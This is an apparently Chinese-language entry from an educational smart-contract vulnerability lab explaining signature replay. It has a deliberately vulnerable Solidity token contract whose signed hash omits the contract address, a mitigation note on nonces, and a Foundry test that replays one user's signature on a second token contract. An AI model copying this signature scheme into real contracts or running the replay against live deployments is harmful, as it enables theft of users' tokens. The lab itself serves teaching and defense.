# 签名重放
[SignatureReplay.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/SignatureReplay.sol)  
**名称：** 签名重放漏洞  
**描述：**  
在这种情况下，Alice签署了一项交易，允许Bob将代币从Alice 的账户转移到 Bob 的账户。  

然后，Bob在多个合约（在本例中为 TokenWhale 和 SixEyeToken 合约）上重放此签名，每次都授权将代币从Alice的账户转移到他的账户。这是可能的，因为合约使用相同的方法来签署和验证交易，但它们不共享nonce值来防止重放攻击。   

缺少针对签名重放攻击的保护，可以多次使用相同的签名来执行函数。  


**缓解建议：**   
可以通过在签名和验证过程中使用nonce（仅使用一次的数字）来防止重放攻击。  

**参考：**  
https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57  
https://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25  


**TokenWhale合约：**  
```
contract TokenWhale is Test {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 2000;
        balanceOf[player] = 2000;
    }

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        emit log_named_uint("nonce", nonce);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            balanceOf[_to] + _value < balanceOf[_to] ||
            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]
        ) revert();
        balanceOf[_to] += _value;

        balanceOf[msg.sender] += _feeUgt;

        balanceOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}
```  
**如何测试：**  
forge test --contracts src/test/SignatureReplay.sol -vvvv 
```  
// 使用代币合约演示重放攻击的函数
function testSignatureReplay() public {
    // 记录合约的当前余额。
    emit log_named_uint(
        "Balance",
        TokenWhaleContract.balanceOf(address(this))
    );

    // 根据输入数据生成唯一的哈希值
    bytes32 hash = keccak256(
        abi.encodePacked(
            address(alice),
            address(bob),
            uint256(499),
            uint256(1),
            uint256(0)
        )
    );

    // 记录哈希值
    emit log_named_bytes32("hash", hash);

    // 使用地址的私钥对哈希进行签名
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

    // 记录签名组件
    emit log_named_uint("v", v);
    emit log_named_bytes32("r", r);
    emit log_named_bytes32("s", s);

    // 从签名中恢复签名者的地址
    address alice_address = ecrecover(hash, v, r, s);

    // 记录签名者的地址
    emit log_named_address("alice_address", alice_address);

    // 通知可能的攻击
    emit log_string(
        "If attacker got the Alice's signature, the attacker can replay this signature on the others contracts with same method."
    );

    // Bob变成了恶作剧者
    vm.startPrank(bob);

    // Bob使用Alice的签名将代币从Alice的账户转移到他的账户
    TokenWhaleContract.transferProxy(
        address(alice),
        address(bob),
        499,
        1,
        v,
        r,
        s
    );

    // 记录Bob的新余额
    emit log_named_uint(
        "SET token balance of Bob",
        TokenWhaleContract.balanceOf(address(bob))
    );

    // 记录攻击的下一步
    emit log_string(
        "Try to replay to another contract with same signature"
    );

    //在重放之前用另一个代币记录Bob的余额。
    emit log_named_uint(
        "Before the replay, SIX token balance of bob:",
        SixEyeTokenContract.balanceOf(address(bob))
    );

    // Bob使用Alice的签名在不同的合约中转移代币
    SixEyeTokenContract.transferProxy(
        address(alice),
        address(bob),
        499,
        1,
        v,
        r,
        s
    );

    // 记录Bob在第二份合约中的新余额
    emit log_named_uint(
        "After the replay, SIX token balance of bob:",
        SixEyeTokenContract.balanceOf(address(bob))
    );

    // Bob尝试在同一个合约上重放攻击，但由于随机数检查而失败
    SixEyeTokenContract.transferProxy(
        address(alice),
        address(bob),
        499,
        1,
        v,
        r,
        s
    );

    //  第二次尝试后记录Bob的余额
    emit log_named_uint(
        "After the second replay, SIX token balance of bob:",
        SixEyeTokenContract.balanceOf(address(bob))
    );
}
```  
**红框：** 签名重放。  
![Alt text](image-19.png)